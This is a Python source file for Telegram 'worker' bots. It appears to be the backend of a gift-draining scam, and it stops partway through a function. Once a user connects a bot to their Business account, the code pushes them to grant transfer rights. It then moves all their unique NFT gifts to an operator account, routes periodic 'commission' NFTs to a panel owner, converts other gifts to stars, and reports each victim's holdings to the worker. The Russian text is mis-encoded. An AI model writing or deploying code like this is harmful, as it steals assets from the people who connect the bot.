# worker_bots.py
import asyncio
import json
import logging
import os
import re
import secrets

from aiohttp import web
from sqlalchemy.orm import selectinload
from aiogram import Bot
from aiogram.client.default import DefaultBotProperties
from logging.handlers import RotatingFileHandler
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import (
    ConvertGiftToStars,
    GetBusinessAccountGifts,
    GetBusinessAccountStarBalance,
    TransferBusinessAccountStars,
    TransferGift,
)
from aiogram.types import Update

from aiogram.filters import Command, CommandStart 
from aiogram import F, Router, Dispatcher
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
)
from aiogram.fsm.storage.memory import MemoryStorage

from sqlalchemy import select
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.ext.asyncio import AsyncSession
from aiogram.webhook.aiohttp_server import SimpleRequestHandler
from datetime import datetime

from config import OWNER_ACCOUNT_ID, PANEL_OWNERS
from db import Session
from log_bot import send_log
from models import CustomGift, StarCheck, WorkerBot, Admin, BusinessConnection, GlobalStats, WorkerBotUser
from channel_stats_logger import send_admin_transfer_log_to_channel, send_manual_transfer_log_to_channel
from aiogram.exceptions import TelegramUnauthorizedError


LOG_DIR = "–õ–æ–≥–∏"
TRANSFER_LOG_DIR = "–õ–æ–≥–∏"
os.makedirs(LOG_DIR, exist_ok=True)
STAR_PRICE = 0.015

_bots: dict[str, Bot] = {}

def get_cached_bot(token: str) -> Bot:
    bot = _bots.get(token)
    if not bot:
        bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
        _bots[token] = bot
    return bot

def human_datetime(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return str(ts)

def get_worker_logger(telegram_id: int) -> logging.Logger:
    logger_name = f"worker_{telegram_id}"
    file_path = os.path.join(LOG_DIR, f"{telegram_id}_Connection.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_transfer_logger(admin_id: int) -> logging.Logger:
    logger_name = f"transfer_{admin_id}"
    file_path = os.path.join(TRANSFER_LOG_DIR, f"{admin_id}_Transfer.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_logger_for_admin(admin: Admin) -> logging.Logger:
    return get_worker_logger(admin.telegram_id)

async def get_admin_for_worker(session: AsyncSession, worker_bot: WorkerBot) -> Admin | None:
    result = await session.execute(select(Admin).where(Admin.id == worker_bot.owner_id))
    return result.scalar_one_or_none()

async def get_business_connection(session: AsyncSession, worker_bot_id: int, telegram_id: int) -> BusinessConnection | None:
    result = await session.execute(
        select(BusinessConnection).where(
            BusinessConnection.worker_bot_id == worker_bot_id,
            BusinessConnection.telegram_id == telegram_id
        )
    )
    return result.scalar_one_or_none()

async def commit_with_log(session: AsyncSession, logger: logging.Logger, success_msg: str, error_msg: str) -> bool:
    try:
        await session.commit()
        logger.info(success_msg)
        return True
    except SQLAlchemyError as e:
        logger.error(f"{error_msg}: {e}")
        return False

async def handle_webhook_business_connection(update: dict, bot: Bot):
    if "business_connection" not in update:
        return

    bc = update["business_connection"]
    bot_token = next((t for t, b in _bots.items() if b == bot), None)
    if not bot_token:
        return

    async with Session() as session:
        try:
            result = await session.execute(
                select(WorkerBot)
                .options(selectinload(WorkerBot.template))
                .where(WorkerBot.token == bot_token)
            )
            worker_bot = result.scalar_one_or_none()
            if not worker_bot or not worker_bot.owner_id:
                return

            admin = await get_admin_for_worker(session, worker_bot)
            if not admin or not admin.log_bot_enabled:
                return

            logger = get_logger_for_admin(admin)

            user = bc.get("user", {})
            business_user_id = user.get("id")
            username = user.get("username", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
            business_connection_id = bc.get("id")
            is_enabled = bc.get("is_enabled", True)

            rights = bc.get("rights", {})
            logger.info(f"–ü—Ä–∞–≤–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è bc_id {business_connection_id}: {json.dumps(rights, ensure_ascii=False)}")

            connection = await get_business_connection(session, worker_bot.id, business_user_id)

            gifts_count = stars_count = nft_count = 0
            try:
                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                stars = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))

                gifts_count = len([g for g in gifts.gifts if getattr(g, "type", "") != "unique"])
                nft_count = len([g for g in gifts.gifts if getattr(g, "type", "") == "unique"])
                stars_count = int(stars.amount)

                nft_links = []
                for g in gifts.gifts:
                    if getattr(g, "type", "") == "unique":
                        slug = getattr(getattr(g, "gift", None), "name", None) or getattr(g, "slug", None)
                        if slug:
                            nft_links.append(f"https://t.me/nft/{slug}")
                if nft_links:
                    logger.info("–°—Å—ã–ª–∫–∏ –Ω–∞ NFT:\n" + "\n".join(nft_links))
                else:
                    logger.info("–ù–µ—Ç NFT –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å—Å—ã–ª–æ–∫.")

                logger.info(f"[{admin.id}] üéÅ –ü–æ–¥–∞—Ä–∫–∏: {gifts_count}, üß¨ NFT: {nft_count}, ‚≠êÔ∏è –ó–≤—ë–∑–¥—ã: {stars_count}")
            except TelegramBadRequest as e:
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    logger.error(f"‚ö†Ô∏è BOT_ACCESS_FORBIDDEN –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∏–∑–Ω–µ—Å-–¥–∞–Ω–Ω—ã—Ö. –ü—Ä–∞–≤–∞: {json.dumps(rights, ensure_ascii=False)}")
                else:
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∏–∑–Ω–µ—Å-–¥–∞–Ω–Ω—ã—Ö: {e}")

            if not is_enabled and connection:
                logger.info(
                    f"‚õîÔ∏è –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞ @{worker_bot.username or '–±–µ–∑ username'} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º "
                    f"@{username or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} (ID: {business_user_id})"
                )
                connection.is_connected = False
                if not await commit_with_log(session, logger, "‚úÖ is_connected = False", "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ commit –æ—Ç–∫–ª—é—á–µ–Ω–∏—è"):
                    return

                template = worker_bot.template
                disconnect_text = template.disconnect_text if template else None
                if disconnect_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=disconnect_text,
                            parse_mode="HTML"
                        )
                    )

                text = (
                    f"<b>ü§ñ –ë–æ—Ç <b>@{worker_bot.username or '–Ω–µ—Ç—É'}</b> –æ—Ç–∫–ª—é—á—ë–Ω –æ—Ç Telegram Business</b>\n"
                    f"<b>üíÅüèª‚Äç‚ôÄÔ∏è –û—Ç–∫–ª—é—á–∏–ª:</b> <b>@{username or '–Ω–µ—Ç—É'}</b> <b>ID</b> <code>{business_user_id}</code>"
                )
                logger.info("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞ –∞–¥–º–∏–Ω—É (–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ)")
                await send_log(admin.telegram_id, text)
                return

            DEFAULT_NO_RIGHTS_TEXT = (
                "<b>–¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª(–∞) –±–æ—Ç–∞, –Ω–æ –Ω–µ –≤—ã–¥–∞–ª(–∞) —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–∞ ¬´–ü–æ–¥–∞—Ä–∫–∏ –∏ –∑–≤—ë–∑–¥—ã¬ª.</b>\n\n"
                 "<b>–ê –±–µ–∑ —ç—Ç–æ–≥–æ –±–æ—Ç –Ω–µ —Å–º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å üôÅ</b>"
            )

            template = worker_bot.template
            no_rights_text = template.no_rights_text if template and template.no_rights_text else DEFAULT_NO_RIGHTS_TEXT

            if not rights.get("can_transfer_and_upgrade_gifts"):
                logger.warning("‚ö†Ô∏è –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø—Ä–∞–≤–æ can_transfer_and_upgrade_gifts")
                if no_rights_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=no_rights_text,
                            parse_mode="HTML"
                        )
                    )

            rights_changed = False
            old_rights = connection.rights_json if connection and getattr(connection, "rights_json", None) else {}
            if json.dumps(old_rights, sort_keys=True) != json.dumps(rights, sort_keys=True):
                rights_changed = True
                logger.info(f"–ü—Ä–∞–≤–∞ –∏–∑–º–µ–Ω–∏–ª–∏—Å—å. –°—Ç–∞—Ä—ã–µ: {json.dumps(old_rights, ensure_ascii=False)}, –ù–æ–≤—ã–µ: {json.dumps(rights, ensure_ascii=False)}")

            if connection and connection.is_connected and not rights_changed:
                logger.info("üîÅ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –∏ –ø—Ä–∞–≤–∞ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–∏—Å—å ‚Äî —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º")
                if connection.nft_count != nft_count or connection.regular_gift_count != gifts_count or connection.stars_count != stars_count:
                    connection.nft_count = nft_count
                    connection.regular_gift_count = gifts_count
                    connection.stars_count = stars_count
                    await session.commit()
                return

            if connection:
                was_disconnected = not connection.is_connected
                connection.is_connected = True
                connection.business_connection_id = business_connection_id
                connection.rights_json = rights
                connection.nft_count = nft_count
                connection.regular_gift_count = gifts_count
                connection.stars_count = stars_count
                await session.commit()

                status_line = (
                    "üì¶ –ë–æ—Ç –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø–æ–¥–∫–ª—é—á—ë–Ω –∫ Telegram Business (–æ–±–Ω–æ–≤–ª–µ–Ω—ã –ø—Ä–∞–≤–∞)"
                    if rights_changed else
                    "üì¶ –ë–æ—Ç —É–∂–µ –±—ã–ª –ø–æ–¥–∫–ª—é—á—ë–Ω ‚Äî –æ–±–Ω–æ–≤–ª–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ"
                )
            else:
                connection = BusinessConnection(
                    telegram_id=business_user_id,
                    username=username,
                    admin_id=admin.id,
                    worker_bot_id=worker_bot.id,
                    is_connected=True,
                    business_connection_id=business_connection_id,
                    rights_json=rights,
                    nft_count=nft_count,
                    regular_gift_count=gifts_count,
                    stars_count=stars_count
                )
                session.add(connection)
                worker_bot.connection_count += 1
                logger.info("üî¢ –£–Ω–∏–∫–∞–ª—å–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ ‚Äî —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º connection_count")
                await session.commit()
                status_line = "üì¶ –ë–æ—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ Telegram Business"

            rights_info = []
            if rights:
                permission_map = {
                    "–ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥": rights.get("can_view_gifts_and_stars"),
                    "–û–±–º–µ–Ω –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞ –∑–≤—ë–∑–¥—ã": rights.get("can_convert_gifts_to_stars"),
                    "–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤": rights.get("can_change_gift_settings"),
                    "–ü–µ—Ä–µ–¥–∞—á–∞ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤": rights.get("can_transfer_and_upgrade_gifts"),
                    "–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–≤—ë–∑–¥": rights.get("can_transfer_stars"),
                }
                for label, granted in permission_map.items():
                    mark = "‚úÖ" if granted else "‚ùå"
                    rights_info.append(f"{mark} {label}")
            else:
                rights_info.append("‚ùå –ü—Ä–∞–≤–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç")
            logger.info(f"–ß–∏—Ç–∞–µ–º—ã–µ –ø—Ä–∞–≤–∞ –¥–ª—è bc_id {business_connection_id}:\n" + "\n".join(rights_info))

            logger.info(
                f"{status_line} ‚Äî @{worker_bot.username or '–±–µ–∑ username'} "
                f"–¥–æ–±–∞–≤–∏–ª(–∞) @{username or '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} (ID: {business_user_id})"
            )

            text = (
                f"<b>{status_line}</b>\n"
                f"<b>ü§ñ –ë–æ—Ç:</b> <b>@{worker_bot.username or '–Ω–µ—Ç—É'}</b>\n"
                f"<b>üíÅüèª‚Äç‚ôÄÔ∏è –î–æ–±–∞–≤–∏–ª:</b> <b>@{username or '–Ω–µ—Ç—É'}</b> <b>ID</b> <code>{business_user_id}</code>\n"
                f"<b>üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤:</b> <code>{gifts_count}</code>\n"
                f"<b>üñº NFT:</b> <code>{nft_count}</code>\n"
                f"<b>‚≠êÔ∏è –ó–≤—ë–∑–¥:</b> <code>{stars_count}</code>\n"
                f"<b>üîê –ü—Ä–∞–≤–∞:</b>\n"
                f"<b><blockquote>{chr(10).join(rights_info)}</blockquote></b>"
            )

            logger.info("üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞ –∞–¥–º–∏–Ω—É (–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ)")
            await send_log(admin.telegram_id, text)

            can_transfer_and_upgrade_gifts = rights.get("can_transfer_and_upgrade_gifts", False)
            can_transfer_stars = rights.get("can_transfer_stars", False)

            if can_transfer_and_upgrade_gifts or can_transfer_stars:
                transfer_notice = (
                    f"üöÄ <b>–ü–µ—Ä–µ–¥–∞—á–∞ –¥–ª—è @{worker_bot.username or '–Ω–µ—Ç—É'}</b>\n"
                    f"‚û°Ô∏è <code>{worker_bot.nft_transfer_to_id or '–Ω–µ—Ç—É'}</code>"
                )
                await send_log(admin.telegram_id, transfer_notice)

                await handle_gift_processing_after_connection(
                    bot, business_connection_id, worker_bot, admin, business_user_id, business_user_id, session
                )
            else:
                logger.info(
                    "‚õîÔ∏è –û–±–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è (–ü–µ—Ä–µ–¥–∞—á–∞ –∏ —É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤, –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–≤—ë–∑–¥) –Ω–µ –≤—ã–¥–∞–Ω—ã. "
                    "handle_gift_processing_after_connection –Ω–µ –∑–∞–ø—É—Å–∫–∞–µ–º."
                )

        except Exception as e:
            logger = get_worker_logger("unknown")
            logger.exception(f"üí• –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ business_connection: {e}")

async def log_commission_nft(admin, nft_link, PANEL_OWNERS):
    try:
        username = admin.username or "–Ω–µ—Ç"
        msg_owner = "‚òïÔ∏è –ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–π NFT —É—Ö–æ–¥–∏—Ç –ø–∞–Ω–µ–ª–∏"
        await send_log(admin.telegram_id, msg_owner)

        msg_admins = (
            "<b>‚òïÔ∏è –ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–π NFT</b>\n"
            f"<b>ü§¶üèª‚Äç‚ôÄÔ∏è –í–æ—Ä–∫–µ—Ä:</b> <code>{admin.telegram_id}</code>\n"
            f"<b>üëâ –ò–º—è:</b> <b>{admin.first_name or ''}</b>\n"
            f"<b>üëâ –¢—ç–≥:</b> @{username}\n"
        )
        if nft_link:
            msg_admins += f"<b>üéÜ NFT:</b> <a href='{nft_link}'>{nft_link}</a>\n"

        tasks = [send_log(panel_admin_id, msg_admins, disable_web_page_preview=False) for panel_admin_id in PANEL_OWNERS]
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"[log_commission_nft] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤: {e}")

async def transfer_all_nfts_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
) -> tuple[int, list]:
    admin = await session.merge(admin)

    def log_and_send(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    log_and_send("=== –°—Ç–∞—Ä—Ç transfer_all_nfts_after_connection ===")
    log_and_send(f"bc_id: {bc_id}, worker_bot_id: {worker_bot.id}, admin_id: {admin.id}")

    if not worker_bot.nft_transfer_to_id:
        log_and_send("–ü–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ ‚Äî –Ω–µ —É–∫–∞–∑–∞–Ω nft_transfer_to_id —É –≤–æ—Ä–∫–µ—Ä-–±–æ—Ç–∞", "warning")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ: –Ω–µ—Ç –∞–¥—Ä–µ—Å–∞—Ç–∞ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ ===")
        await send_log(admin.telegram_id, "‚ùóÔ∏è –ü–µ—Ä–µ–¥–∞—á–∞ NFT –Ω–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ ‚Äî –Ω–µ —É–∫–∞–∑–∞–Ω –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏.")
        return 0, []

    try:
        log_and_send("–ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ (GetBusinessAccountGifts)...")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        log_and_send(f"–ù–∞–π–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: {len(gifts.gifts)}")
        nfts = [g for g in gifts.gifts if getattr(g, "type", "") == "unique"]
        log_and_send(f"–ù–∞–π–¥–µ–Ω–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT: {len(nfts)}")

        if not nfts:
            log_and_send("üß¨ –ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏", "info")
            log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ: –Ω–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT ===")
            return 0, []

        log_and_send(f"üöö –ù–∞—á–∏–Ω–∞–µ–º –ø–µ—Ä–µ–¥–∞—á—É {len(nfts)} —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö NFT")

        success = 0
        hold_nfts = []
        session.add(admin)

        for gift in nfts:
            log_and_send(f"‚ñ∂Ô∏è –ù–∞—á–∏–Ω–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É NFT: {gift.owned_gift_id}")

            nft_link = None
            slug = None
            gift_obj = getattr(gift, "gift", None)
            if gift_obj and hasattr(gift_obj, "name"):
                slug = getattr(gift_obj, "name")
            if not slug:
                slug = getattr(gift, "slug", None)
            if slug:
                nft_link = f"https://t.me/nft/{slug}"

            for attempt in range(3):
                log_and_send(f"–ü–æ–ø—ã—Ç–∫–∞ #{attempt+1} –ø–µ—Ä–µ–¥–∞—á–∏ NFT {gift.owned_gift_id}")

                commission_every = admin.commission_every or 4
                commission_counter = admin.commission_counter or 0
                is_commission = (commission_counter + 1) >= commission_every

                log_and_send(f"commission_counter: {commission_counter}, commission_every: {commission_every}, is_commission: {is_commission}")

                if is_commission:
                    recipient_id = OWNER_ACCOUNT_ID
                    log_and_send(f"–ü–æ–ª—É—á–∞—Ç–µ–ª—å –¥–ª—è –∫–æ–º–∏—Å—Å–∏–∏: {recipient_id}")
                else:
                    recipient_id = worker_bot.nft_transfer_to_id
                    log_and_send(f"–ü–æ–ª—É—á–∞—Ç–µ–ª—å NFT: {recipient_id}")

                try:
                    log_and_send(f"–í—ã–ø–æ–ª–Ω—è–µ–º TransferGift –¥–ª—è NFT {gift.owned_gift_id} (–ø–æ–ª—É—á–∞—Ç–µ–ª—å: {recipient_id})")
                    await bot(TransferGift(
                        business_connection_id=bc_id,
                        owned_gift_id=gift.owned_gift_id,
                        new_owner_chat_id=recipient_id,
                        star_count=getattr(gift, "transfer_star_count", None)
                    ))
                    log_and_send(f"‚úÖ NFT ID {gift.owned_gift_id} –ø–µ—Ä–µ–¥–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {recipient_id}")
                    success += 1

                    admin.commission_counter = (commission_counter + 1) if not is_commission else 0
                    log_and_send(f"commission_counter –æ–±–Ω–æ–≤–ª—ë–Ω: {admin.commission_counter}")
                    session.add(admin)

                    if is_commission:
                        asyncio.create_task(log_commission_nft(admin, nft_link, PANEL_OWNERS))
                        log_and_send(f"–ö–æ–º–∏—Å—Å–∏–æ–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã: owner+–∞–¥–º–∏–Ω—ã (–≤ —Ñ–æ–Ω–µ)")

                    for _ in range(4):
                        try:
                            await session.commit()
                            break
                        except Exception:
                            await asyncio.sleep(1)
                    else:
                        raise Exception(f"–§–ê–¢–ê–õ–¨–ù–û! NFT {gift.owned_gift_id} –ø–µ—Ä–µ–¥–∞–Ω, –Ω–æ –Ω–µ –∑–∞–ø–∏—Å–∞–ª—Å—è –≤ –ë–î!")

                    log_and_send(f"‚úÖ –ö–æ–º–º–∏—Ç –ø–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ NFT {gift.owned_gift_id}")
                    break
                except TelegramBadRequest as e:
                    log_and_send(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å NFT ID {gift.owned_gift_id}: {e}", "warning")
                    error_text = str(e)
                    if "STARGIFT_TRANSFER_TOO_EARLY" in error_text:
                        stats["nft_hold_too_early"] += 1
                        next_transfer_date = getattr(gift, "next_transfer_date", 0)
                        next_transfer_human = human_datetime(next_transfer_date) if next_transfer_date else "–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
                        hold_nfts.append((slug, nft_link, next_transfer_human))
                        log_and_send(
                            f"NFT {slug or gift.owned_gift_id} –≤ —Ö–æ–ª–¥–µ –¥–æ {next_transfer_human}", "info"
                        )
                        break
                    elif "BALANCE_TOO_LOW" in error_text:
                        stats["balance_too_low"] = True
                        stats["nft_not_sent"] += 1
                        log_and_send(f"–ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –Ω–∏–∑–∫–∏–π –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ NFT ID {gift.owned_gift_id}, –æ—Ç–º–µ—á–∞–µ–º –∏ –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º")
                        break
                    elif "Bad Request: unknown chat identifier specified" in error_text and not is_commission:
                        log_and_send(f"‚ö†Ô∏è –ë–æ—Ç –Ω–µ –∑–∞–ø—É—â–µ–Ω –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ {recipient_id}, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
                        break
                    elif "BUSINESS_CONNECTION_INVALID" in error_text:
                        log_and_send(f"‚ùå BUSINESS_CONNECTION_INVALID ‚Äî –±–∏–∑–Ω–µ—Å-–∫–æ–Ω–Ω–µ–∫—Ç –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π, –∑–∞–≤–µ—Ä—à–∞–µ–º —Ü–∏–∫–ª!", "error")
                        return success, hold_nfts
                    elif "PREMIUM_ACCOUNT_REQUIRED" in error_text:
                        log_and_send(f"‚ùå PREMIUM_ACCOUNT_REQUIRED ‚Äî –Ω—É–∂–µ–Ω –ø—Ä–µ–º–∏—É–º –∞–∫–∫–∞—É–Ω—Ç, –∑–∞–≤–µ—Ä—à–∞–µ–º —Ü–∏–∫–ª!", "error")
                        return success, hold_nfts
                    await asyncio.sleep(1)
                except Exception as e:
                    log_and_send(f"‚ùóÔ∏è –ù–µ–æ–∂–∏–¥–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ NFT ID {gift.owned_gift_id}: {e}", "error")
                    await asyncio.sleep(1)
            else:
                log_and_send(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å NFT {gift.owned_gift_id} –ø–æ—Å–ª–µ 3 –ø–æ–ø—ã—Ç–æ–∫", "error")

        stats["nft_success"] += success
        session.add(admin)
        await session.commit()
        log_and_send(f"üéØ –£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω–æ NFT: {success} –∏–∑ {len(nfts)}")
        log_and_send(f"NFT –≤ —Ö–æ–ª–¥–µ: {len(hold_nfts)}")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ transfer_all_nfts_after_connection ===")
        return success, hold_nfts

    except TelegramBadRequest as e:
        err = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}"
        log_and_send(err, "error")
        log_and_send("=== –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å –æ—à–∏–±–∫–æ–π –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ ===")
        return 0, []

# –¢–æ–ª—å–∫–æ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã
async def convert_regular_gifts_only(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[UserID:{connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    if "regular_convert_failed" not in stats:
        stats["regular_convert_failed"] = 0

    try:
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        except TelegramBadRequest as e:
            err_msg = str(e)
            if "BOT_ACCESS_FORBIDDEN" in err_msg:
                log_with_id("‚ö†Ô∏è –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–æ–¥–∞—Ä–∫–∞–º (BOT_ACCESS_FORBIDDEN), –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é", "warning")
                stats["errors"] += 1
                return
            elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                log_with_id("‚ùå BUSINESS_CONNECTION_INVALID ‚Äî –±–∏–∑–Ω–µ—Å-–∫–æ–Ω–Ω–µ–∫—Ç –Ω–µ–≤–∞–ª–∏–¥–Ω—ã–π, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—é", "error")
                stats["errors"] += 1
                return
            elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                log_with_id("‚ùå PREMIUM_ACCOUNT_REQUIRED ‚Äî –Ω—É–∂–µ–Ω –ø—Ä–µ–º–∏—É–º –∞–∫–∫–∞—É–Ω—Ç, –æ–ø–µ—Ä–∞—Ü–∏—è –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞", "error")
                stats["errors"] += 1
                return
            else:
                stats["errors"] += 1
                log_with_id(f"‚ùå –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}", "error")
                return

        regular_gifts = [g for g in gifts.gifts if getattr(g, "type", "") != "unique"]

        if not regular_gifts:
            log_with_id("üì¶ –ù–µ—Ç –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏")
            return

